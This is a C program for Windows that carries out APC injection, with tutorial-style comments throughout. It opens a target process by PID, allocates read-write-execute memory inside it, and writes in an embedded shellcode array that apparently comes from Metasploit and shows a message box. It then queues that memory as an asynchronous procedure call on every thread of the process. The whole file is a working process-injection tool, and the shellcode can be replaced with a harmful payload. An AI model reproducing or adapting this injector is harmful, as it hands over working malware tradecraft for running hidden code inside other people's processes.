#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h> 

int main(int argc, char* argv[])
{
	unsigned int victimProcessId;

	if (argc > 1)
	{
		/*
		The function atoi() isn't the best solution for converting a char pointer to integer,
		as it will convert any invalid number to 0.
		A better solution is described here: https://stackoverflow.com/questions/2797813/how-to-convert-a-command-line-argument-to-int
		*/
		victimProcessId = atoi(argv[1]);
		printf("[+] Performing APC Injection inside the victim process identified by the PID: %d\n", victimProcessId);
	}
	else
	{
		printf("[+] Usage:\n\tprogram.exe PID\n");
		return 1;
	}

	/*
	Use OpenProcess to get a handle to the victim process.
	In this case, I'm using the process access rights
	PROCESS_VM_OPERATION and PROCESS_VM_WRITE (value: 0x20), because
	I want to write some memory inside that process.
	*/
	DWORD desiredAccess = PROCESS_VM_OPERATION | PROCESS_VM_WRITE;
	HANDLE victimProcessHandle = OpenProcess(
		desiredAccess,								// PROCESS_VM_OPERATION and PROCESS_VM_WRITE are enough for a successful call to VirtualAllocEx
													// however WriteProcessMemory also requires PROCESS_VM_WRITE according to the docs 
		NULL,										// whether the processes created by this process can inherit this handle
													// in this case it's NULL, so no inheritance
		victimProcessId);							// open this specific process

	/*
	According to the official documentation, OpenProcess returns NULL if it fails to get a handle
	Ref: https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
	*/
	if (victimProcessHandle == NULL)
	{
		printf("[!] Call to OpenProcess failed\n");

		/*
		According to the official documentation, you can use the function GetLastError() to get
		extended error information
		Ref: https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-getlasterror
		*/
		printf("[!] Specific Win32 error: %d\n", GetLastError());

		return 1;
	}
	else
	{
		printf("[+] Successfully created a handle for the victim process\n");
	}

	/*
	Allocate some space inside the memory of the victim process.
	Later it will store our malicious shellcode.
	For more information regarding the arguments of VirtualAllocEx:
	https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
	*/
	LPVOID allocatedMemory = VirtualAllocEx(
		victimProcessHandle,					// reserve a new memory page inside the victim process
		NULL,									// we don't care where to allocate the memory
		4096,									// allocate 4096 bytes
		MEM_COMMIT | MEM_RESERVE,				// commit and reserve memory in one step
		PAGE_EXECUTE_READWRITE);				// set the memory page as readable/writable

	if (allocatedMemory == NULL)
	{
		printf("[!] Call to VirtualAllocEx failed\n");
		printf("[!] Specific Win32 error: %d\n", GetLastError());

		return 1;
	}
	else
	{
		printf("[+] Successfully allocated some memory in the victim process\n");
		printf("[+] Starting address: %p\n", allocatedMemory);
	}

	char shellcode[] =
		"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
		"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
		"\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
		"\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
		"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
		"\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
		"\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
		"\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
		"\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
		"\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
		"\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
		"\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
		"\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
		"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
		"\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e\x4c\x8d"
		"\x85\x2b\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
		"\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
		"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
		"\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x48\x65\x6c\x6c\x6f"
		"\x2c\x20\x66\x72\x6f\x6d\x20\x4d\x53\x46\x21\x00\x4d\x65\x73"
		"\x73\x61\x67\x65\x42\x6f\x78\x00";

	/*
	Now that we have defined/initialized the array for the shellcode,
	we can copy it into the memory of the victim process.
	We can use the space allocated by VirtualAllocEx.
	*/
	BOOL retVal = WriteProcessMemory(
		victimProcessHandle,			// handle to the process in which to the write the bytes
		allocatedMemory,				// starting address where to write the bytes
		shellcode,						// buffer containing the bytes to write
		sizeof(shellcode),				// number of bytes to write, in this case: the size of the path
		NULL);							// pointer to variable which will contain the number of bytes written
										// in this case, we don't really need it

	if (retVal == 0)
	{
		printf("[!] Call to WriteProcessMemory failed\n");
		printf("[!] Specific Win32 error: %d\n", GetLastError());

		return 1;
	}

	else
	{
		printf("[+] Successfully wrote the shellcode inside the allocated memory space\n");
	}

	HANDLE handleToolhelpSnapshot = CreateToolhelp32Snapshot(
		TH32CS_SNAPTHREAD,								// create a snapshot of all the threads of the victim process
		victimProcessId									// process ID of the victim process
	);

	if (handleToolhelpSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("[!] Call to CreateToolhelp32Snapshot failed\n");
		printf("[!] Specific Win32 error: %d\n", GetLastError());
		return 1;
	}
	else
	{
		printf("[+] Successfully managed to get a handle to a snapshot for the victim process: %d\n", handleToolhelpSnapshot);
	}

	/*
	According to the official documentation, "the calling application must set the dwSize member
	of MODULEENTRY32 to the size, in bytes, of the structure".
	*/
	THREADENTRY32 threadEntryStructure;
	threadEntryStructure.dwSize = sizeof(THREADENTRY32);

	HANDLE threadHandle;

	if (Thread32First(handleToolhelpSnapshot, &threadEntryStructure))
	{
		/*
		Repeat the functions OpenThreads/QueueUserAPC so we can add
		the Async. Procedure Call to the queue of each thread.
		*/
		do
		{
			/*
			Check that the Thread ID belongs to the victim process we're targeting
			*/
			if (threadEntryStructure.th32OwnerProcessID == victimProcessId)
			{

				/*
				Get a handle to the thread, as requred by the function QueueUserAPC
				*/
				threadHandle = OpenThread(
					THREAD_SET_CONTEXT,
					FALSE,
					threadEntryStructure.th32ThreadID
				);

				if (threadHandle == NULL)
				{
					printf("[!] Call to OpenThread failed\n");
					printf("[!] Specific Win32 error: %d\n", GetLastError());
					return 1;
				}
				else
				{
					printf("[+] Successfully got a handle to the thread %d\n", threadEntryStructure.th32ThreadID);
				}

				/*
				Add an APC to the queue of the thread.
				The function of the APC is the address of the memory page I allocated previously.
				The memory page must be readable and executable.
				Depending on the shellcode, it could need write permissions too.
				*/
				if (QueueUserAPC((PAPCFUNC)allocatedMemory, threadHandle, NULL) == 0)
				{
					printf("[!] Call to QueueUserAPC failed\n");
					printf("[!] Specific Win32 error: %d\n", GetLastError());
					return 1;
				}
				else
				{
					printf("[+] Successfully added the APC to the queue of the thread\n");
				}
			}
		} while (Thread32Next(handleToolhelpSnapshot, &threadEntryStructure));
	}
}
